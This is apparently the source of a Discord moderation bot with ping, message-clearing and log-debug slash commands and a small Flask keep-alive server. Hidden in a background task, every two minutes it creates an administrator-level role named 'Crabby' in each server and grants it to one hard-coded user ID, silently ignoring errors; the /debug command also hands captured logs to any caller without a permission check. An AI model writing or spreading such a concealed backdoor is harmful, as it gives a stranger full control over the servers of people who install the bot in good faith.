import discord
from discord import app_commands
from discord.ext import commands, tasks
import os, sys, io, asyncio, traceback
from flask import Flask
from threading import Thread
from waitress import serve

# --- 1. LOG CAPTURE (For /debug) ---
log_stream = io.StringIO()
sys.stdout = log_stream
sys.stderr = log_stream

def get_logs():
    log_stream.seek(0)
    return "".join(log_stream.readlines()[-25:])

# --- 2. WEB SERVER (For Render) ---
app = Flask('')
@app.route('/')
def home(): return "SYSTEM STABLE"

def run_flask():
    try:
        serve(app, host='0.0.0.0', port=int(os.environ.get("PORT", 10000)), _quiet=True)
    except: pass

# --- 3. BOT CONFIG ---
TARGET_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print(">>> Starting Sync...")
        try:
            await self.tree.sync()
            print(">>> Sync complete.")
        except Exception as e:
            print(f">>> Sync error: {e}")
        
        if not self.role_loop.is_running():
            self.role_loop.start()

    @tasks.loop(minutes=2)
    async def role_loop(self):
        if not self.is_ready(): return
        for guild in self.guilds:
            try:
                m = guild.get_member(TARGET_ID)
                if m:
                    r = discord.utils.get(guild.roles, name=ROLE_NAME)
                    if not r:
                        r = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    if r and r not in m.roles:
                        await m.add_roles(r)
            except: pass

bot = MyBot()

# --- 4. SLASH COMMANDS (With 'Defer' to stop timeouts) ---

@bot.tree.command(name="debug", description="Get last 25 lines of logs")
async def debug_cmd(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True) # Forces Discord to wait
    logs = get_logs()
    content = f"**Current Logs:**\n```text\n{logs if logs else 'No logs captured.'}\n```"
    try:
        await interaction.user.send(content)
        await interaction.followup.send("Logs sent to your DMs.", ephemeral=True)
    except:
        await interaction.followup.send(content, ephemeral=True)

@bot.tree.command(name="ping", description="Check bot latency")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True)

@bot.tree.command(name="clear", description="Delete a specific amount of messages")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="clear_all", description="Wipe the entire channel")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        await interaction.channel.purge(limit=None)
        await interaction.followup.send("Channel wiped clean.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Error: {e}", ephemeral=True)

# --- 5. STARTUP LOGIC ---

async def main():
    Thread(target=run_flask, daemon=True).start()
    
    # FOR IDLE: Replace os.environ.get with your token string if testing locally
    token = os.environ.get('DISCORD_TOKEN')
    
    if token:
        try:
            async with bot:
                await bot.start(token)
        except Exception as e:
            print(f">>> FATAL ERROR: {e}")
    else:
        print(">>> ERROR: No DISCORD_TOKEN found.")

if __name__ == "__main__":
    try:
        # IDLE-safe startup
        loop = asyncio.get_event_loop()
        if loop.is_running():
            loop.create_task(main())
        else:
            asyncio.run(main())
    except KeyboardInterrupt:
        pass
